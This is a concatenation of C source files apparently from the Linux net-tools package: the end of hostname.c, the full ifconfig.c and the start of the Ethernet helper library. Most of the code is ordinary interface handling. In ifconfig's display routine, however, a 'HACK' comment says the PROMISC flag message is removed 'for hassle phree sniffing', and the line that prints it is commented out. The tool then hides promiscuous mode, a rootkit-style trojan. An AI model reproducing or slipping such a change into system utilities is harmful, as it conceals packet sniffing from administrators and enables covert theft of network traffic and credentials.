					   "\nUnless you are using bind or NIS for host lookups you can change the DNS\n"));
				fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_nodns3,
					   "domain name (which is part of the FQDN) in the /etc/hosts file.\n"));
				NLS_CATCLOSE(catfd)
				exit(1);
			}
			type='d';			
			/* NOBREAK */
		case 0:
			if (file) {
				setfilename(file,SETHOST);
				break;
			}
			if (optind < argc) {
				sethname(argv[optind]);
				break;
			}
		case 1:
			gethostname(myname, sizeof(myname));
			if (opt_v)
				fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_verb_get, 
					"gethostname()=`%s'\n"),myname);
			if (!type)
				printf("%s\n",myname);
			else
				showhname(myname,type);
			break;
		case 3:
			if (file) {
				setfilename(file,SETDOMAIN);
				break;
			}
			if (optind < argc) {
				setdname(argv[optind]);
				break;
			}
			getdomainname(myname,sizeof(myname));
			if (opt_v)
				fprintf(stderr,NLS_CATGETS(catfd, hostnameSet, hostname_verb_dget, 
					"getdomainname()=`%s'\n"),myname);
			printf("%s\n",myname);
			break;
	}
	NLS_CATCLOSE(catfd)
	exit(0);
}
/*
 * ifconfig	This file contains an implementation of the command
 *		that either displays or sets the characteristics of
 *		one or more of the system's networking interfaces.
 *
 * Usage:	ifconfig [-a] [-i] [-v] interface
 *			[inet address]
 *			[ax25] [hw] address]
 *			[metric NN] [mtu NN]
 *			[trailers] [-trailers]
 *			[arp] [-arp]
 *			[netmask aa.bb.cc.dd]
 *			[dstaddr aa.bb.cc.dd]
 *			[mem_start NN] [io_addr NN] [irq NN]
 *			[[-] broadcast [aa.bb.cc.dd]]
 *			[[-]pointopoint [aa.bb.cc.dd]]
 *			[up] [down] ...
 *
 * Version:	ifconfig 1.22 (1996-05-09)
 *
 * Author:	Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
 *		Copyright 1993 MicroWalt Corporation
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/netdevice.h>
#include <linux/if.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/ipx.h>
#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <ctype.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "net-support.h"
#include "pathnames.h"
#include "version.h"
#include "config.h"
#include "net-locale.h"


struct interface {
  char			name[IFNAMSIZ];		/* interface name	 */
  short			type;			/* if type		 */
  short			flags;			/* various flags	 */
  int			metric;			/* routing metric	 */
  int			mtu;			/* MTU value		 */
  struct ifmap		map;			/* hardware setup	 */
  struct sockaddr	addr;			/* IP address		 */
  struct sockaddr	dstaddr;		/* P-P IP address	 */
  struct sockaddr	broadaddr;		/* IP broadcast address	 */
  struct sockaddr	netmask;		/* IP network mask	 */
  struct sockaddr	ipxaddr_bb;		/* IPX network address   */
  struct sockaddr	ipxaddr_sn;		/* IPX network address   */
  struct sockaddr	ipxaddr_e3;		/* IPX network address   */
  struct sockaddr	ipxaddr_e2;		/* IPX network address   */
  struct sockaddr	ddpaddr;		/* Appletalk DDP address */
  int			has_ip;
  int			has_ipx_bb;
  int			has_ipx_sn;
  int			has_ipx_e3;
  int			has_ipx_e2;
  int			has_ax25;
  int			has_ddp;
  char			hwaddr[32];		/* HW address		 */
  struct enet_statistics stats;			/* statistics		 */
};

  
char *Release = RELEASE,
     *Version = "ifconfig 1.22 (1996-05-09)";


int opt_a = 0;				/* show all interfaces		*/
int opt_i = 0;				/* show the statistics		*/
int opt_v = 0;				/* debugging output flag	*/
int skfd = -1;				/* generic raw socket desc.	*/
int ipx_sock = -1;			/* IPX socket			*/
int ax25_sock = -1;			/* AX.25 socket			*/
int inet_sock = -1;			/* INET socket			*/
int ddp_sock = -1;			/* Appletalk DDP socket		*/
int addr_family = 0;			/* currently selected AF	*/


static void
ife_print(struct interface *ptr)
{
  struct aftype *ap;
  struct hwtype *hw;
  int hf;
  char *dispname=NLS_CATSAVE (catfd, ifconfigSet, ifconfig_over, "overruns");
  static struct aftype *ipxtype=NULL, *ddptype=NULL;
  
  ap = get_afntype(ptr->addr.sa_family);
  if (ap == NULL) ap = get_afntype(0);

  hf=ptr->type;

  if(strncmp(ptr->name,"lo",2)==0)
  	hf=255;
  	
  if(hf==ARPHRD_CSLIP || hf==ARPHRD_CSLIP6)
  {
#if NLS
        /* NLS must free dispname */
        free (dispname);
#endif
  	/* Overrun got reused: BAD - fix later */
  	dispname=NLS_CATSAVE (catfd, ifconfigSet, ifconfig_compress, "compressed");
  }
  	
  hw = get_hwntype(hf);
  if (hw == NULL) hw = get_hwntype(-1);

  printf(NLS_CATGETS(catfd, ifconfigSet, ifconfig_link, "%-8.8s  Link encap:%s  "),
	 ptr->name, hw->title);
  if (hw->sprint != NULL) {
	printf(NLS_CATGETS(catfd, ifconfigSet, ifconfig_hw, "HWaddr %s")
	       , hw->print(ptr->hwaddr));
  }
  printf(NLS_CATGETS(catfd, ifconfigSet, ifconfig_adr,
		     "\n          %s addr:%s"), ap->name, ap->sprint(&ptr->addr, 1));
  if (ptr->flags & IFF_POINTOPOINT) {
	printf(NLS_CATGETS(catfd, ifconfigSet, ifconfig_pap, "  P-t-P:%s  "),
	       ap->sprint(&ptr->dstaddr, 1));
  } else {
	printf(NLS_CATGETS(catfd, ifconfigSet, ifconfig_bcast, "  Bcast:%s  "),
	       ap->sprint(&ptr->broadaddr, 1));
  }
  printf(NLS_CATGETS(catfd, ifconfigSet, ifconfig_mask, "Mask:%s\n"),
		     ap->sprint(&ptr->netmask, 1));
  
  if(ipxtype==NULL)
  	ipxtype=get_afntype(AF_IPX);
  if(ipxtype!=NULL)
  {
	  if(ptr->has_ipx_bb)
	  	printf(NLS_CATGETS(catfd, ifconfigSet, ifconfig_etherII,
				   "          IPX/Ethernet II addr:%s\n"),
		       ipxtype->sprint(&ptr->ipxaddr_bb,1));
	  if(ptr->has_ipx_sn)
	  	printf(NLS_CATGETS(catfd, ifconfigSet, ifconfig_SNAP,
				   "          IPX/Ethernet SNAP addr:%s\n"),
		       ipxtype->sprint(&ptr->ipxaddr_sn,1));
	  if(ptr->has_ipx_e2)
	  	printf(NLS_CATGETS(catfd, ifconfigSet, ifconfig_8022,
				   "          IPX/Ethernet 802.2 addr:%s\n"),
		       ipxtype->sprint(&ptr->ipxaddr_e2,1));
	  if(ptr->has_ipx_e3)
	  	printf(NLS_CATGETS(catfd, ifconfigSet, ifconfig_8023,
				   "          IPX/Ethernet 802.3 addr:%s\n"),
		       ipxtype->sprint(&ptr->ipxaddr_e3,1));
  }
  if(ddptype==NULL)
  	ddptype=get_afntype(AF_APPLETALK);
  if(ddptype!=NULL)
  {
	  if(ptr->has_ddp)
	  	printf(NLS_CATGETS(catfd, ifconfigSet, ifconfig_talk,
				   "          EtherTalk Phase 2 addr:%s\n"),
		       ddptype->sprint(&ptr->ddpaddr,1));
  }
  printf("          ");
  if (ptr->flags == 0) printf(NLS_CATGETS(catfd, ifconfigSet, ifconfig_noflags,
					  "[NO FLAGS] "));
  if (ptr->flags & IFF_UP) printf("UP ");
  if (ptr->flags & IFF_BROADCAST) printf("BROADCAST ");
  if (ptr->flags & IFF_DEBUG) printf("DEBUG ");
  if (ptr->flags & IFF_LOOPBACK) printf("LOOPBACK ");
  if (ptr->flags & IFF_POINTOPOINT) printf("POINTOPOINT ");
  if (ptr->flags & IFF_NOTRAILERS) printf("NOTRAILERS ");
  if (ptr->flags & IFF_RUNNING) printf("RUNNING ");
  if (ptr->flags & IFF_NOARP) printf("NOARP ");
/* HACK remove PROMISC message for hassle phree sniffing */
/* if (ptr->flags & IFF_PROMISC) printf("PROMISC "); */
  if (ptr->flags & IFF_ALLMULTI) printf("ALLMULTI ");
  if (ptr->flags & IFF_SLAVE) printf("SLAVE ");
  if (ptr->flags & IFF_MASTER) printf("MASTER ");
  if (ptr->flags & IFF_MULTICAST) printf("MULTICAST ");
  printf(NLS_CATGETS(catfd, ifconfigSet, ifconfig_mtu, " MTU:%d  Metric:%d\n"),
	 ptr->mtu, ptr->metric?ptr->metric:1);


  /* If needed, display the interface statistics. */
  printf("          ");
  printf(NLS_CATGETS(catfd, ifconfigSet, ifconfig_rx,
		     "RX packets:%u errors:%u dropped:%u %s:%u\n"),
	 ptr->stats.rx_packets, ptr->stats.rx_errors,
	 ptr->stats.rx_dropped, dispname, ptr->stats.rx_fifo_errors);
  printf("          ");
  printf(NLS_CATGETS(catfd, ifconfigSet, ifconfig_tx,
		     "TX packets:%u errors:%u dropped:%u %s:%u\n"),
	 ptr->stats.tx_packets, ptr->stats.tx_errors,
	 ptr->stats.tx_dropped, dispname, ptr->stats.tx_fifo_errors);

  if(hf<255 && (ptr->map.irq || ptr->map.mem_start || ptr->map.dma || ptr->map.base_addr))
  {
  	printf("          ");
  	if(ptr->map.irq)
  		printf(NLS_CATGETS(catfd, ifconfigSet, ifconfig_interrupt,
				   "Interrupt:%d "), ptr->map.irq);
  	if(ptr->map.base_addr>=0x100)	/* Only print devices using it for I/O maps */
  		printf(NLS_CATGETS(catfd, ifconfigSet, ifconfig_base,
				   "Base address:0x%x "), ptr->map.base_addr);
  	if(ptr->map.mem_start)
  	{
  		printf(NLS_CATGETS(catfd, ifconfigSet, ifconfig_mem, "Memory:%lx-%lx "),
  			ptr->map.mem_start,ptr->map.mem_end);
  	}
  	if(ptr->map.dma)
  		printf(NLS_CATGETS(catfd, ifconfigSet, ifconfig_dma, "DMA chan:%x "),
		       ptr->map.dma);
  	printf("\n");
  }
  printf("\n");

#if NLS
  /* NLS must free dispname */
  free (dispname);
#endif
}


static void if_getstats(char *ifname, struct interface *ife)
{
  FILE *f=fopen("/proc/net/dev","r");
  char buf[256];
  char *bp;
  if(f==NULL)
  	return;
  while(fgets(buf,255,f))
  {
  	bp=buf;
  	while(*bp&&isspace(*bp))
  		bp++;
  	if(strncmp(bp,ifname,strlen(ifname))==0 && bp[strlen(ifname)]==':')
  	{
 		bp=strchr(bp,':');
 		bp++;
 		sscanf(bp,"%d %d %d %d %d %d %d %d %d %d %d",
 			&ife->stats.rx_packets,
 			&ife->stats.rx_errors,
 			&ife->stats.rx_dropped,
 			&ife->stats.rx_fifo_errors,
 			&ife->stats.rx_frame_errors,
 			
 			&ife->stats.tx_packets,
 			&ife->stats.tx_errors,
 			&ife->stats.tx_dropped,
 			&ife->stats.tx_fifo_errors,
 			&ife->stats.collisions,
 			
 			&ife->stats.tx_carrier_errors
 		);
 		fclose(f);
 		return;
  	}
  }
  fclose(f);
}

/* Support for fetching an IPX address */

static int ipx_getaddr(int sock, int ft, struct ifreq *ifr)
{
	((struct sockaddr_ipx *)&ifr->ifr_addr)->sipx_type=ft;
	return ioctl(sock, SIOCGIFADDR, ifr);
}

/* Fetch the inteface configuration from the kernel. */
static int
if_fetch(char *ifname, struct interface *ife)
{
  struct ifreq ifr;

  memset((char *) ife, 0, sizeof(struct interface));
  strcpy(ife->name, ifname);

  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFFLAGS, &ifr) < 0) return(-1);
  ife->flags = ifr.ifr_flags;

  strcpy(ifr.ifr_name, ifname);
  if (ioctl(inet_sock, SIOCGIFADDR, &ifr) < 0) {
	memset(&ife->addr, 0, sizeof(struct sockaddr));
  } else ife->addr = ifr.ifr_addr;

  strcpy(ifr.ifr_name, ifname);
  
  if (ioctl(skfd, SIOCGIFHWADDR, &ifr) < 0) {
	memset(ife->hwaddr, 0, 32);
  } else memcpy(ife->hwaddr,ifr.ifr_hwaddr.sa_data,8);

  ife->type=ifr.ifr_hwaddr.sa_family;

  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFMETRIC, &ifr) < 0) {
	ife->metric = 0;
  } else ife->metric = ifr.ifr_metric;

  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFMTU, &ifr) < 0) {
	ife->mtu = 0;
  } else ife->mtu = ifr.ifr_mtu;

  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFMAP, &ifr) < 0) {
	memset(&ife->map, 0, sizeof(struct ifmap));
  } else memcpy(&ife->map,&ifr.ifr_map,sizeof(struct ifmap));

  strcpy(ifr.ifr_name, ifname);
  if (ioctl(inet_sock, SIOCGIFDSTADDR, &ifr) < 0) {
	memset(&ife->dstaddr, 0, sizeof(struct sockaddr));
  } else ife->dstaddr = ifr.ifr_dstaddr;

  strcpy(ifr.ifr_name, ifname);
  if (ioctl(inet_sock, SIOCGIFBRDADDR, &ifr) < 0) {
	memset(&ife->broadaddr, 0, sizeof(struct sockaddr));
  } else ife->broadaddr = ifr.ifr_broadaddr;

  strcpy(ifr.ifr_name, ifname);
  if (ioctl(inet_sock, SIOCGIFNETMASK, &ifr) < 0) {
	memset(&ife->netmask, 0, sizeof(struct sockaddr));
  } else ife->netmask = ifr.ifr_netmask;
  
  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFMAP, &ifr) < 0) {
  	memset(&ife->map, 0, sizeof(struct ifmap));
  }
  else ife->map = ifr.ifr_map;
  
  /* DDP address maybe ? */
  strcpy(ifr.ifr_name, ifname);
  if (ioctl(ddp_sock, SIOCGIFADDR, &ifr)==0)
  {
  	ife->ddpaddr=ifr.ifr_addr;
  	ife->has_ddp=1;
  }
  
  /* Look for IPX addresses with all framing types */
  strcpy(ifr.ifr_name, ifname);
  
  if(!ipx_getaddr(ipx_sock, IPX_FRAME_ETHERII, &ifr))
  {
  	ife->has_ipx_bb=1;
  	ife->ipxaddr_bb=ifr.ifr_addr;
  }
  strcpy(ifr.ifr_name, ifname);
  if(!ipx_getaddr(ipx_sock, IPX_FRAME_SNAP, &ifr))
  {
  	ife->has_ipx_sn=1;
  	ife->ipxaddr_sn=ifr.ifr_addr;
  }
  strcpy(ifr.ifr_name, ifname);
  if(!ipx_getaddr(ipx_sock, IPX_FRAME_8023, &ifr))
  {
  	ife->has_ipx_e3=1;
  	ife->ipxaddr_e3=ifr.ifr_addr;
  }
  strcpy(ifr.ifr_name, ifname);
  if(!ipx_getaddr(ipx_sock, IPX_FRAME_8022, &ifr))
  {
  	ife->has_ipx_e2=1;
  	ife->ipxaddr_e2=ifr.ifr_addr;
  }
  
  if_getstats(ifname,ife);
  return(0);
}


static void
if_print(char *ifname)
{
  char buff[1024];
  struct interface ife;
  struct ifconf ifc;
  struct ifreq *ifr;
  int i;

  if (ifname == (char *)NULL) {
	ifc.ifc_len = sizeof(buff);
	ifc.ifc_buf = buff;
	if (ioctl(skfd, SIOCGIFCONF, &ifc) < 0) {
		fprintf(stderr, "SIOCGIFCONF: %s\n", strerror(errno));
		return;
	}

	ifr = ifc.ifc_req;
	for (i = ifc.ifc_len / sizeof(struct ifreq); --i >= 0; ifr++) {
		if (if_fetch(ifr->ifr_name, &ife) < 0) {
			fprintf(stderr, NLS_CATGETS(catfd, ifconfigSet, ifconfig_unkn,
						    "%s: unknown interface.\n"),
				ifr->ifr_name);
			continue;
		}

		if (((ife.flags & IFF_UP) == 0) && !opt_a) continue;
		ife_print(&ife);
	}
  } else {
	if (if_fetch(ifname, &ife) < 0)
		fprintf(stderr, NLS_CATGETS(catfd, ifconfigSet, ifconfig_unkn,
					    "%s: unknown interface.\n"), ifname);
	  else ife_print(&ife);
  }
}


/* Set a certain interface flag. */
static int
set_flag(char *ifname, short flag)
{
  struct ifreq ifr;

  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFFLAGS, &ifr) < 0) return(-1);
  ifr.ifr_flags |= flag;
  if (ioctl(skfd, SIOCSIFFLAGS, &ifr) < 0) {
	fprintf(stderr, "SIOCSIFFLAGS: %s\n", strerror(errno));
	return(-1);
  }
  return(0);
}


/* Clear a certain interface flag. */
static int
clr_flag(char *ifname, short flag)
{
  struct ifreq ifr;

  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFFLAGS, &ifr) < 0) return(-1);
  ifr.ifr_flags &= ~flag;
  if (ioctl(skfd, SIOCSIFFLAGS, &ifr) < 0) {
	fprintf(stderr, "SIOCSIFFLAGS: %s\n", strerror(errno));
	return(-1);
  }
  return(0);
}


static void
usage(void)
{
  fprintf(stderr, NLS_CATGETS(catfd, ifconfigSet, ifconfig_usage1,
			      "Usage: ifconfig [-a] [-i] [-v] interface\n"));
  fprintf(stderr, NLS_CATGETS(catfd, ifconfigSet, ifconfig_usage2,
			      "                [inet address]\n"));
  fprintf(stderr, NLS_CATGETS(catfd, ifconfigSet, ifconfig_usage3,
			      "                [hw] [ax25 address]\n"));
  fprintf(stderr, "                [metric NN] [mtu NN]\n");
  fprintf(stderr, "                [trailers] [-trailers]\n");
  fprintf(stderr, "                [arp] [-arp]\n");
  fprintf(stderr, "                [netmask aa.bb.cc.dd]\n");
  fprintf(stderr, "                [dstaddr aa.bb.cc.dd]\n");
  fprintf(stderr, "                [mem_start NN] [io_addr NN] [irq NN]\n");
  fprintf(stderr, "                [[-] broadcast [aa.bb.cc.dd]]\n");
  fprintf(stderr, "                [[-]pointopoint [aa.bb.cc.dd]]\n");
  fprintf(stderr, "                [up] [down] ...\n");
  NLS_CATCLOSE(catfd)
  exit(1);
}

static void
version(void)
{
  fprintf(stderr,"%s\n%s\n",Release,Version);
  NLS_CATCLOSE(catfd)
  exit(1);
}

static int sockets_open()
{
	inet_sock=socket(AF_INET, SOCK_DGRAM, 0);
	ipx_sock=socket(AF_IPX, SOCK_DGRAM, 0);
	ax25_sock=socket(AF_AX25, SOCK_DGRAM, 0);
	ddp_sock=socket(AF_APPLETALK, SOCK_DGRAM, 0);
	/*
	 *	Now pick any (exisiting) useful socket family for generic queries
	 */
	if(inet_sock!=-1)
		return inet_sock;
	if(ipx_sock!=-1)
		return ipx_sock;
	if(ax25_sock!=-1)
		return ax25_sock;
	/*
	 *	If this is -1 we have no known network layers and its time to jump.
	 */
	 
	return ddp_sock;
}
	
int
main(int argc, char **argv)
{
  struct sockaddr sa;
  char host[128];
  struct aftype *ap;
  struct hwtype *hw;
  struct ifreq ifr;
  int goterr = 0;
  char **spp;

#if NLS
  setlocale (LC_MESSAGES, "");
  catfd = catopen ("nettools", MCLoadBySet);
#endif

  /* Create a channel to the NET kernel. */
  if ((skfd = sockets_open()) < 0) {
	perror("socket");
	NLS_CATCLOSE(catfd)
	exit(-1);
  }
  /* Find any options. */
  argc--; argv++;
  while (argc && *argv[0] == '-') {
	if (!strcmp(*argv, "-a")) opt_a = 1;
	
	if (!strcmp(*argv, "-v")) opt_v = 1;
	
	if (!strcmp(*argv, "-V") || !strcmp(*argv, "-version") || 
	    !strcmp(*argv, "--version")) version();
	    
	if (!strcmp(*argv, "-?") || !strcmp(*argv, "-h") || 
	    !strcmp(*argv, "-help") || !strcmp(*argv, "--help")) usage();

	argv++;
	argc--;
  }

  /* Do we have to show the current setup? */
  if (argc == 0) {
	if_print((char *)NULL);
	(void) close(skfd);
	NLS_CATCLOSE(catfd)
	exit(0);
  }

  /* No. Fetch the interface name. */
  spp = argv;
  strncpy(ifr.ifr_name, *spp++, IFNAMSIZ);
  if (*spp == (char *)NULL) {
	if_print(ifr.ifr_name);
	(void) close(skfd);
	NLS_CATCLOSE(catfd)
	exit(0);
  }

  /* The next argument is either an address family name, or an option. */
  if ((ap = get_aftype(*spp)) == NULL) {
	ap = get_aftype("inet");
  } else spp++;
  addr_family = ap->af;

  /* Process the remaining arguments. */
  while (*spp != (char *)NULL) {
	if (!strcmp(*spp, "arp")) {
		goterr |= clr_flag(ifr.ifr_name, IFF_NOARP);
		spp++;
		continue;
	}

	if (!strcmp(*spp, "-arp")) {
		goterr |= set_flag(ifr.ifr_name, IFF_NOARP);
		spp++;
		continue;
	}

	if (!strcmp(*spp, "trailers")) {
		goterr |= clr_flag(ifr.ifr_name, IFF_NOTRAILERS);
		spp++;
		continue;
	}

	if (!strcmp(*spp, "-trailers")) {
		goterr |= set_flag(ifr.ifr_name, IFF_NOTRAILERS);
		spp++;
		continue;
	}

	if (!strcmp(*spp, "promisc")) {
		goterr |= set_flag(ifr.ifr_name, IFF_PROMISC);
		spp++;
		continue;
	}

	if (!strcmp(*spp, "-promisc")) {
		goterr |= clr_flag(ifr.ifr_name, IFF_PROMISC);
		spp++;
		continue;
	}

	if (!strcmp(*spp, "multicast")) {
		goterr |= set_flag(ifr.ifr_name, IFF_MULTICAST);
		spp++;
		continue;
	}

	if (!strcmp(*spp, "-multicast")) {
		goterr |= clr_flag(ifr.ifr_name, IFF_MULTICAST);
		spp++;
		continue;
	}

	if (!strcmp(*spp, "allmulti")) {
		goterr |= set_flag(ifr.ifr_name, IFF_ALLMULTI);
		spp++;
		continue;
	}

	if (!strcmp(*spp, "-allmulti")) {
		goterr |= clr_flag(ifr.ifr_name, IFF_ALLMULTI);
		spp++;
		continue;
	}

	if (!strcmp(*spp, "up")) {
		goterr |= set_flag(ifr.ifr_name, (IFF_UP | IFF_RUNNING));
		spp++;
		continue;
	}

	if (!strcmp(*spp, "down")) {
		goterr |= clr_flag(ifr.ifr_name, IFF_UP);
		spp++;
		continue;
	}

	if (!strcmp(*spp, "metric")) {
		if (*++spp == NULL) usage();
		ifr.ifr_metric = atoi(*spp);
		if (ioctl(skfd, SIOCSIFMETRIC, &ifr) < 0) {
			fprintf(stderr, "SIOCSIFMETRIC: %s\n", strerror(errno));
			goterr = 1;
		}
		spp++;
		continue;
	}

	if (!strcmp(*spp, "mtu")) {
		if (*++spp == NULL) usage();
		ifr.ifr_mtu = atoi(*spp);
		if (ioctl(skfd, SIOCSIFMTU, &ifr) < 0) {
			fprintf(stderr, "SIOCSIFMTU: %s\n", strerror(errno));
			goterr = 1;
		}
		spp++;
		continue;
	}

	if (!strcmp(*spp, "-broadcast")) {
		goterr |= clr_flag(ifr.ifr_name, IFF_BROADCAST);
		spp++;
		continue;
	}

	if (!strcmp(*spp, "broadcast")) {
		if (*++spp != NULL ) {
			strcpy(host, *spp);
			if (ap->input(0, host, &sa) < 0) {
				ap->herror(host);
				goterr = 1;
				spp++;
				continue;
			}
			memcpy((char *) &ifr.ifr_broadaddr, (char *) &sa,
						sizeof(struct sockaddr));
			if (ioctl(skfd, SIOCSIFBRDADDR, &ifr) < 0) {
				fprintf(stderr, "SIOCSIFBRDADDR: %s\n",
							strerror(errno));
				goterr = 1;
			}
			spp++;
		}
		goterr |= set_flag(ifr.ifr_name, IFF_BROADCAST);
		continue;
	}

	if (!strcmp(*spp, "dstaddr")) {
		if (*++spp == NULL) usage();
		strcpy(host, *spp);
		if (ap->input(0, host, &sa) < 0) {
			ap->herror(host);
			goterr = 1;
			spp++;
			continue;
		}
		memcpy((char *) &ifr.ifr_dstaddr, (char *) &sa,
						sizeof(struct sockaddr));
		if (ioctl(skfd, SIOCSIFDSTADDR, &ifr) < 0) {
			fprintf(stderr, "SIOCSIFDSTADDR: %s\n",
						strerror(errno));
			goterr = 1;
		}
		spp++;
		continue;
	}

	if (!strcmp(*spp, "netmask")) {
		if (*++spp == NULL) usage();
		strcpy(host, *spp);
		if (ap->input(0, host, &sa) < 0) {
			ap->herror(host);
			goterr = 1;
			spp++;
			continue;
		}
		memcpy((char *) &ifr.ifr_netmask, (char *) &sa,
						sizeof(struct sockaddr));
		if (ioctl(skfd, SIOCSIFNETMASK, &ifr) < 0) {
			fprintf(stderr, "SIOCSIFNETMASK: %s\n",
						strerror(errno));
			goterr = 1;
		}
		spp++;
		continue;
	}

	if (!strcmp(*spp, "mem_start")) {
		if (*++spp == NULL) usage();
		if (ioctl(skfd, SIOCGIFMAP, &ifr) < 0) {
			goterr = 1;
			continue;
		}
		ifr.ifr_map.mem_start = strtoul(*spp, NULL, 0);
		if (ioctl(skfd, SIOCSIFMAP, &ifr) < 0) {
			fprintf(stderr, "SIOCSIFMAP: %s\n", strerror(errno));
			goterr = 1;
		}
		spp++;
		continue;
	}

	if (!strcmp(*spp, "io_addr")) {
		if (*++spp == NULL) usage();
		if (ioctl(skfd, SIOCGIFMAP, &ifr) < 0) {
			goterr = 1;
			continue;
		}
		ifr.ifr_map.base_addr = strtol(*spp, NULL, 0);
		if (ioctl(skfd, SIOCSIFMAP, &ifr) < 0) {
			fprintf(stderr, "SIOCSIFMAP: %s\n", strerror(errno));
			goterr = 1;
		}
		spp++;
		continue;
	}

	if (!strcmp(*spp, "irq")) {
		if (*++spp == NULL) usage();
		if (ioctl(skfd, SIOCGIFMAP, &ifr) < 0) {
			goterr = 1;
			continue;
		}
		ifr.ifr_map.irq = atoi(*spp);
		if (ioctl(skfd, SIOCSIFMAP, &ifr) < 0) {
			fprintf(stderr, "SIOCSIFMAP: %s\n", strerror(errno));
			goterr = 1;
		}
		spp++;
		continue;
	}

	if (!strcmp(*spp, "-pointopoint")) {
		goterr |= clr_flag(ifr.ifr_name, IFF_POINTOPOINT);
		spp++;
		continue;
	}

	if (!strcmp(*spp, "pointopoint")) {
		if (*(spp+1) != NULL) {
			spp++;
			strcpy(host, *spp);
			if (ap->input(0, host, &sa)) {
				ap->herror(host);
				goterr = 1;
				spp++;
				continue;
			};
			memcpy((char *) &ifr.ifr_dstaddr, (char *) &sa,
						sizeof(struct sockaddr));
			if (ioctl(skfd, SIOCSIFDSTADDR, &ifr) < 0) {
				fprintf(stderr, "SIOCSIFDSTADDR: %s\n",
							strerror(errno));
				goterr = 1;
			}
		}
		goterr |= set_flag(ifr.ifr_name, IFF_POINTOPOINT);
		spp++;
		continue;
	};

	if (!strcmp(*spp, "hw")) {
		if (*++spp == NULL) usage();
		if ((hw = get_hwtype(*spp)) == NULL) usage();
		strcpy(host, *++spp);
		if (hw->input(host, &sa) < 0) {
			ap->herror(host);
			goterr = 1;
			spp++;
			continue;
		}
		memcpy((char *) &ifr.ifr_hwaddr, (char *) &sa,
						sizeof(struct sockaddr));
		if (ioctl(skfd, SIOCSIFHWADDR, &ifr) < 0) {
			fprintf(stderr, "SIOCSIFHWADDR: %s\n",
						strerror(errno));
			goterr = 1;
		}
		spp++;
		continue;
	}

	/* If the next argument is a valid hostname, assume OK. */
	strcpy(host, *spp);
	if (ap->input(0, host, &sa) < 0) {
		ap->herror(host);
		usage();
	}

	memcpy((char *) &ifr.ifr_addr, (char *) &sa, sizeof(struct sockaddr));
	if (ioctl(skfd, SIOCSIFADDR, &ifr) < 0) {
		fprintf(stderr, "SIOCSIFADDR: %s\n", strerror(errno));
			goterr = 1;
	}
	goterr |= set_flag(ifr.ifr_name, (IFF_UP | IFF_RUNNING));
	spp++;
  }

  /* Close the socket. */
  (void) close(skfd);

  NLS_CATCLOSE(catfd)
  return(goterr);
}
/*
 * lib/ether.c	This file contains an implementation of the "Ethernet"
 *		support functions for the NET-2 base distribution.
 *
 * Version:	@(#)ether.c	1.10	10/07/93
 *
 * Author:	Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
 *		Copyright 1993 MicroWalt Corporation
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include "config.h"

#if HAVE_HWETHER
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/netdevice.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <ctype.h>
#include <string.h>
#include <unistd.h>
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"


extern struct hwtype ether_hwtype;


/* Display an Ethernet address in readable format. */
static char *
pr_ether(unsigned char *ptr)
{
  static char buff[64];

  sprintf(buff, "%02X:%02X:%02X:%02X:%02X:%02X",
	(ptr[0] & 0377), (ptr[1] & 0377), (ptr[2] & 0377),
	(ptr[3] & 0377), (ptr[4] & 0377), (ptr[5] & 0377)
  );
  return(buff);
}


/* Display an Ethernet socket address. */
static char *
pr_sether(struct sockaddr *sap)
{
  static char buf[64];

  if (sap->sa_family == 0xFFFF || sap->sa_family == 0)
    return(NLS_CATBUFF (catfd, etherSet, ether_none, "[NONE SET]", buf, 64));
  return(pr_ether(sap->sa_data));
}


/* Input an Ethernet address and convert to binary. */
static int
in_ether(char *bufp, struct sockaddr *sap)
{
  unsigned char *ptr;
  char c, *orig;
  int i, val;

  sap->sa_family = ether_hwtype.type;
  ptr = sap->sa_data;

  i = 0;
  orig = bufp;
  while((*bufp != '\0') && (i < ETH_ALEN)) {
	val = 0;
	c = *bufp++;
	if (isdigit(c)) val = c - '0';
	  else if (c >= 'a' && c <= 'f') val = c - 'a' + 10;
	  else if (c >= 'A' && c <= 'F') val = c - 'A' + 10;
	  else {
#ifdef DEBUG
		fprintf(stderr, NLS_CATGETS(catfd, etherSet, ether_debug1,
					    "in_ether(%s): invalid ether address!\n"), orig);
#endif
		errno = EINVAL;
		return(-1);
	}
	val <<= 4;
	c = *bufp++;
	if (isdigit(c)) val |= c - '0';
	  else if (c >= 'a' && c <= 'f') val |= c - 'a' + 10;
	  else if (c >= 'A' && c <= 'F') val |= c - 'A' + 10;
	  else {
#ifdef DEBUG
		fprintf(stderr, NLS_CATGETS(catfd, etherSet, ether_debug2,
					    "in_ether(%s): invalid ether address!\n"), orig);
#endif
		errno = EINVAL;
		return(-1);
	}
	*ptr++ = (unsigned char) (val & 0377);
	i++;

	/* We might get a semicolon here - not required. */
	if (*bufp == ':') {
		if (i == ETH_ALEN) {
#ifdef DEBUG
			fprintf(stderr, NLS_CATGETS(catfd, etherSet, ether_debug3,
						    "in_ether(%s): trailing : ignored!\n"),
									orig)
#endif
						; /* nothing */
		}
		bufp++;
	}
